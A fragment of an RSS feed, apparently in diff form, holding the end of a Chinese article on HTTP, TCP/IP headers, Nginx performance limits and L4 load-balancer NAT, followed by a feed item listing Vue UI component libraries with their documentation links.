true&lt;br/&gt;&lt;br/&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;br/&gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;head&amp;gt;&lt;br/&gt;    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;&lt;br/&gt;    &amp;lt;title&amp;gt;httpbin.org&amp;lt;/title&amp;gt;&lt;br/&gt;    &amp;lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700|Source+Code+Pro:300,600|Titillium+Web:400,600,700&quot;&lt;br/&gt;        rel=&quot;stylesheet&quot;&amp;gt;&lt;br/&gt;    &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/flasgger_static/swagger-ui.css&quot;&amp;gt;&lt;br/&gt;    &amp;lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;/static/favicon.ico&quot; sizes=&quot;64x64 32x32 16x16&quot; /&amp;gt;&lt;br/&gt;&amp;lt;/head&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;body&amp;gt;&lt;br/&gt;    &amp;lt;a href=&quot;https://github.com/requests/httpbin&quot; class=&quot;github-corner&quot; aria-label=&quot;View source on Github&quot;&amp;gt;&lt;br/&gt;    &amp;lt;/a&amp;gt;&lt;br/&gt;    ... ... 此处省略一万个字&lt;br/&gt;&amp;lt;/div&amp;gt;&lt;br/&gt;&amp;lt;/body&amp;gt;&lt;br/&gt;&lt;br/&gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;响应数据的基本规则和请求一样，第一行的三个元素分别是 协议版本、状态码、状态码的简短解释。唯一的不同是，返回值里面还有 HTTP body。&lt;/p&gt;&lt;h5&gt;HTTP header 和 HTTP body&lt;/h5&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;两个换行即 \r\n\r\n 之前的内容为 HTTP header&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;两个换行之后的内容为 HTTP body&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;HTTP body 就是你在浏览器“查看源代码”所看到的内容&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;HTTP 下面是 TCP 层&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6573529411764706&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLYm94vcoJnudG9DAov3BptbRSV7egY07mpyyvGKBmzkbbPicG2ljia7icXg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;680&quot;/&gt;&lt;/p&gt;&lt;center&gt;TCP 首部图示&lt;/center&gt;&lt;h4&gt;TCP 首部重要数据描述&lt;/h4&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;TCP 首部中最重要的数据是&lt;code&gt;源端口&lt;/code&gt;和&lt;code&gt;目的端口&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;他们各由 16 位二进制数组成，2^16 = 65536，所以网络端口的范围是 0-65535&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;我们可以注意到，目的端口号这个重要数据是放在 TCP 首部的，和更下层的 IP 首部、以太网帧首部毫无关系&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;TCP 下面是 IP 层&lt;/h3&gt;&lt;p&gt;全球所有公网 IPv4 组成了一个大型网络，这个 IP 网络其实就是&lt;code&gt;互联网&lt;/code&gt;的本体。（IPv6 比较复杂，本文再次不做详细讨论，以下示例均基于 IPv4）&lt;/p&gt;&lt;p&gt;在 IP 层中，每台设备都有一个 ip 地址，形如&lt;code&gt;123.123.123.123&lt;/code&gt;：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;IPv4 地址范围为 0.0.0.0 - 255.255.255.255&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;255 为 2 的 8 次方减一，也就是说用八位二进制可以表示 0-255&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;四个八位即为 32 位，4 个字节&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;IP 首部有哪些信息&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5528846153846154&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLYicAc4IbskwTZvLbeGwEuvQAFOkA9GURaUOGELTuPBhO897VSCaR1dQA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;624&quot;/&gt;&lt;/p&gt;&lt;p&gt;从上图可以看出，ip 首部有 20 字节的固定长度是用来存储这个 IP 数据包的基本信息的：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;源地址 32 位（4 个字节）：123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;目的地址 32 位（4 个字节）：110.242.68.3&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;协议 8 位（1 个字节）：内部数据包使用的协议，即 TCP、UDP 或 ICMP（就是 ping 命令使用的协议）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;首部检验和 16 位（2 个字节）：此 IP 首部的数据校验和，用于验证 IP 首部的数据完整性&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;ip 首部最重要的数据是&lt;code&gt;源 ip 地址&lt;/code&gt;和&lt;code&gt;目的 ip 地址&lt;/code&gt;&lt;/h4&gt;&lt;h3&gt;IP 层下面是 MAC 层(物理层)&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3555992141453831&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLYRu9jSgPq1m5EXJLYo4OL4ewZcjJ62niaumGY4Ar8KGyHZADuFGRaycw/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1018&quot;/&gt;&lt;/p&gt;&lt;p&gt;物理层中的二进制数据以上图中的格式进行组织，其基本单元被称为“MAC 帧”。&lt;/p&gt;&lt;p&gt;每一台网络设备的 MAC 帧的长度不一定一致，默认为 1500，即 IP 层的数据会按照这个长度进行分包。在局域网速度跑不到协商速率，需要做性能优化时（例如 iSCSI 网络磁盘），可以使用“巨型帧”技术，将这个数字增加到一万，可以提升网络传输性能。不过，根据我的实际优化经验，绝大多数场景下，巨型帧对网络性能的提升小于 5%，属于一种聊胜于无的优化手段。&lt;/p&gt;&lt;p&gt;目的地址和源地址均为 MAC 地址，形式如 AA:BB:CC:DD:EE:FF，共有六段，每一段是一个两位的 16 进制数，两位 16 进制数换算成二进制就是 8 位，所以 MAC 地址的长度为 8*6 = 48 位。&lt;/p&gt;&lt;p&gt;类型字段采用 16 位二进制表示更上一层（ip 层）的网络层数据包的类型：IPv4、IPv6、ARP、iSCSI、RoCE 等等。&lt;/p&gt;&lt;p&gt;MAC 层就是交换机工作的地方，我们下篇文章会讲。&lt;/p&gt;&lt;h2&gt;Nginx 的性能极限&lt;/h2&gt;&lt;p&gt;在真实世界中，QPS 一般比保持 TCP 连接的客户端的数量要少，在此我们假设为四分之一，即：有 20 万个客户端设备在这段时间内访问我们的系统，每个客户端设备平均每 4 秒发送一个 HTTPS 请求。&lt;/p&gt;&lt;h3&gt;单台 Nginx 反向代理的性能极限&lt;/h3&gt;&lt;p&gt;由于 Nginx 不仅需要建立 TCP 连接，还需要将 TCP 连接中发送过来的数据包和某个进程/线程进行匹配，还需要对 HTTP 协议的信息进行解析、识别、转换、添加，所以它也有 QPS 上限：&lt;/p&gt;&lt;p&gt;在 2015 年主流的服务器 CPU 上，Nginx 官方在进行了极限优化的情况下进行了反向代理性能测试，在“建立 TCP 连接-发送 HTTPS 请求-断开 TCP 连接”的极限拉扯下，最高性能为 6W QPS（SSL TPS RSA 2048bit）²。&lt;/p&gt;&lt;p&gt;假设我们使用最新的服务器硬件，当虚拟机 CPU 达到 32 vCore 的时候，未经优化的单机 Nginx 性能就已经达到极限，能承受大约 1 万 HTTPS QPS，对应的连接用户就是 4 万，这个数字其实已经很夸张了。&lt;/p&gt;&lt;h2&gt;TCP 负载均衡器为何能抗住五万 QPS&lt;/h2&gt;&lt;p&gt;我们假设单台 Kong 应用网关的极限为 1 万 QPS，于是我们就需要五台 Kong，那这五台 Kong 前面的 TCP 负载均衡为何能够抗住呢？因为 TCP 负载均衡器要干的事情比 Kong 少非常多：它只需要在 IP 层做少量的工作即可。&lt;/p&gt;&lt;h3&gt;使用负载均衡器拆分 TCP 单点&lt;/h3&gt;&lt;p&gt;TCP 协议是一种“可靠地传输信息”的方法，它不仅有三次握手四次挥手等复杂的控制流程，还会对每一个报文段进行排序、确认、重发等操作来保证最终数据的完整和正确，所以，TCP 本身就是一种需要很多资源处理的&lt;code&gt;单点&lt;/code&gt;，接下来我们开始拆这个单点。&lt;/p&gt;&lt;h3&gt;TCP 负载均衡器的工作过程&lt;/h3&gt;&lt;p&gt;我们假设客户端 ip 为 123.123.123.123，负载均衡器的 ip 为 110.242.68.3（公网）和 10.0.0.100（私网），五台 Kong 服务器的 ip 为 10.0.0.1 ~ 10.0.0.5，架构图如下：&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8775252525252525&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA3ENoeFVCSfeyaSoUibPZYLY0fpcxRuUicslPo9gALgZzI5SGicb41dRwTV7WY14GEnbDbf8SzwIVpOg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1584&quot;/&gt;&lt;/p&gt;&lt;p&gt;负载均衡器的工作过程如下：&lt;/p&gt;&lt;h4&gt;1. 接收数据（左侧）&lt;/h4&gt;&lt;p&gt;负载均衡器接收客户端数据包（报文）的过程如下：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;负载均衡器收到了一个 ip 报文：源地址 123.123.123.123，目的地址 110.242.68.3&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;ip 报文内包裹着一个 TCP 报文，详情如下：源端口 52387，目的端口 443&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;注意，负载均衡器只是接收了一个 IP 报文，并没有和客户端进行三次握手，并没有和客户端建立“TCP 连接”&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;2. 发送数据给上游服务器（右侧）&lt;/h4&gt;&lt;p&gt;在接收到客户端的 IP 报文以后，负载均衡器会找一台上游服务器，准备把数据发送过去：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;内部 TCP 报文首部：源端口 45234，目的端口 443&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;TCP 报文外面包裹的 IP 首部：源地址 10.0.0.100，目的地址 10.0.0.1&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;负载均衡器将包裹着 TCP 数据包的 IP 报文发送了出去&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h4&gt;3. 建立两个报文的映射关系并进行数据转发&lt;/h4&gt;&lt;p&gt;负载均衡器会在内存里创建两个五元组：&lt;/p&gt;&lt;p&gt;左侧五元组&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;左侧源地址 123.123.123.123&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;左侧目的地址 110.242.68.3&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;左侧源端口 52387&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;左侧目的地址 443&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;协议 TCP&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;右侧五元组&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;右侧源地址 10.0.0.100&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;右侧目的地址 10.0.0.1&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;右侧源端口 45234&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;右侧目的地址 443&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;协议 TCP&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;然后，负载均衡器会关联这两个五元组：对两侧发来的数据包（报文）进行拆包和修改（两个地址+两个端口），并从另一侧发送出去。&lt;/p&gt;&lt;h3&gt;这是什么？这就是你家的路由器（网关）呀&lt;/h3&gt;&lt;p&gt;看过我《软件工程师需要了解的网络知识》系列文章的同学应该能一眼看出，这就是网关的工作模式，你家几百块的路由器主要干的就是这个工作。&lt;/p&gt;&lt;h4&gt;为什么性能开销比 Kong 低&lt;/h4&gt;&lt;p&gt;我们可以看出，负载均衡器/网关只需要做两件事：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;建立两个五元组并关联&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;修改数据包的地址和端口，再将数据包发送出去&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这个操作在网络领域内被称作 NAT（网络地址转换）。&lt;/p&gt;&lt;p&gt;由于这个工作非常简单，其中大部分的工作都可以用专用硬件来解决：例如开发专门的五元组存储和关联芯片，开发专门的 NPU（网络数据包处理器）来进行快速数据修改。所以，家用路由器可以做到在 300 块终端售价的情况下实现超过 1Gbit/S 的 NAT 性能。&lt;/p&gt;&lt;h4&gt;Kong 网关需要建立“TCP 连接”&lt;/h4&gt;&lt;p&gt;Kong 网关需要真的和客户端“建立 TCP 连接”：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;三次握手建立连接&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;对数据包进行排序、校验，收到心跳包需要回复&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;需要将这个 TCP 连接和一个进程/线程进行绑定：&lt;/p&gt;&lt;/li&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;在收到数据以后，找出这个进程/线程，把数据发送给它&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;等进程/线程回复以后，再找到该进程/线程对应的那个 TCP 连接，把数据发送出去&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;h4&gt;四层负载均衡（L4）和七层负载均衡（L7）&lt;/h4&gt;&lt;p&gt;在卖负载均衡的商业公司那里，应用网关也叫七层负载均衡，因为它工作在 OSI 七层网络模型的第七层，而我们讨论的工作在 IP 层的负载均衡叫四层负载均衡，工作在 OSI 七层网络模型的第四层。再看到 L4 L7 这两个词，你们就能一眼看穿它了，其实一点都不神秘。&lt;/p&gt;&lt;h3&gt;还记得我们的目标吗？一百万 QPS&lt;/h3&gt;&lt;p&gt;我们通过使用一个负载均衡器，可以完美抗下五万 QPS 的负载：一个 TCP 负载均衡器，下挂五个安装了 Kong 应用网关的虚拟机，再下挂 N 台虚拟机，无论是 PHP 语言还是 golang，都可以实现五万 QPS 的设计目标。&lt;/p&gt;&lt;h3&gt;接下来&lt;/h3&gt;&lt;p&gt;下一篇文章，我们将着手突破普通 Linux 系统网络性能的上限：使用软件定义网络（SDN）替代百万人民币的负载均衡硬件，并最终搭建出一个能够支撑 200 Gbps 带宽的负载均衡集群。&lt;/p&gt;&lt;h3&gt;参考资料&lt;/h3&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;软件工程师需要了解的网络知识：从铜线到HTTP（三）—— TCP/IP https://lvwenhan.com/tech-epic/487.html&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;6W QPS（SSL TPS RSA 2048bit） https://www.nginx.com/resources/datasheets/nginx-plus-sizing-guide/&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;本系列文章已经汇总成开源技术书《PPHC》发布在 Github：https://github.com/johnlui/PPHC&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;mp-style-type data-value=&quot;3&quot;/&gt;&lt;/p&gt;&lt;/div&gt;
 
           
         &lt;/div&gt;&lt;/div&gt;</content:encoded>
 </item>
 <item>
-<guid>3338297c8fa61e2634f4fd594067fd89</guid>
-<title>前端 UI 组件库有哪些选择</title>
-<link>https://toutiao.io/k/4ehnmbv</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;lake-content&quot;&gt;
-&lt;h2 id=&quot;gPWZj&quot;&gt;&lt;a name=&quot;toc-1&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue 3&lt;/span&gt;&lt;/h2&gt;
-&lt;h3 id=&quot;IMkab&quot;&gt;&lt;a name=&quot;toc-2&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element Plus&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u3c7c3090&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;基于 Vue 3，面向设计师和开发者的组件库 。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u5e46d077&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;饿了么团队&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u8d069150&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://element-plus.gitee.io/zh-CN/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://element-plus.gitee.io/zh-CN/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://element-plus.gitee.io/zh-CN/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;TryxR&quot;&gt;&lt;a name=&quot;toc-3&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Ant Design Vue&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u79558178&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;ant-design-vue 为 Web 应用提供了丰富的基础 UI 组件，我们还将持续探索企业级应用的最佳 UI 实践。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u41371dfc&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;uda566a9a&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antdv.com/components/overview-cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antdv.com/components/overview-cn&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antdv.com/components/overview-cn&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;s6VHe&quot;&gt;&lt;a name=&quot;toc-4&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vant 4&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u537e83b9&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;轻量、可靠的移动端 Vue 组件库。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;uf05c57ed&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;有赞团队&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ufbd2c52e&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vant-contrib.gitee.io/vant/#/zh-CN&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vant-contrib.gitee.io/vant/#/zh-CN&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vant-contrib.gitee.io/vant/#/zh-CN&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;hxtO6&quot;&gt;&lt;a name=&quot;toc-5&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;VARLET&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u57cfbf36&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Varlet 是一个基于 Vue3 开发的 Material 风格移动端组件库，全面拥抱 Vue3 生态，由社区团队维护。支持 Typescript、按需引入、暗黑模式、主题定制、国际化，并提供 VSCode 插件保障良好的开发体验。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ucb3bd697&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u2f6cef96&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;lu3d8&quot;&gt;&lt;a name=&quot;toc-6&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Naive UI&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;ud5ac6612&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;一个 Vue 3 组件库，比较完整，主题可调，使用 TypeScript，快，有点意思 。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;udb62ba7c&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ue81ad4a7&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://www.naiveui.com/zh-CN/light&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://www.naiveui.com/zh-CN/light&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://www.naiveui.com/zh-CN/light&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;HctsK&quot;&gt;&lt;a name=&quot;toc-7&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;View UI Plus&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;uab443612&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;View UI Plus 是 View Design 设计体系中基于 Vue.js 3 的一套 UI 组件库，主要用于企业级中后台系统。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;uf9809793&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 长沙开发者科技有限公司&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ue5452207&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://www.iviewui.com/view-ui-plus/guide/introduce&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://www.iviewui.com/view-ui-plus/guide/introduce&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://www.iviewui.com/view-ui-plus/guide/introduce&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;IKWQz&quot;&gt;&lt;a name=&quot;toc-8&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;uc53864a7&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify is a no design skills required UI Library with beautifully handcrafted Vue Components. &lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u6863f2f2&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;ud8b36e63&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://next.vuetifyjs.com/en/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://next.vuetifyjs.com/en/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://next.vuetifyjs.com/en/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&quot;niFYW&quot;&gt;&lt;a name=&quot;toc-9&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Wave UI&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;u29da8825&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;A Vue.js UI framework with only the bright side. &lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u51aa5748&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;uff993f06&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antoniandre.github.io/wave-ui/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antoniandre.github.io/wave-ui/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antoniandre.github.io/wave-ui/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;QZ5ve&quot;&gt;&lt;a name=&quot;toc-10&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue 2&lt;/span&gt;&lt;/h2&gt;
-&lt;h3 id=&quot;UvZSJ&quot;&gt;&lt;a name=&quot;toc-11&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vant&lt;/span&gt;&lt;/h3&gt;
-&lt;p id=&quot;ube417963&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;轻量、可靠的移动端 Vue 组件库。&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;u7ef34685&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;有赞团队&lt;/span&gt;&lt;/p&gt;
-&lt;p id=&quot;uc80078ff&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
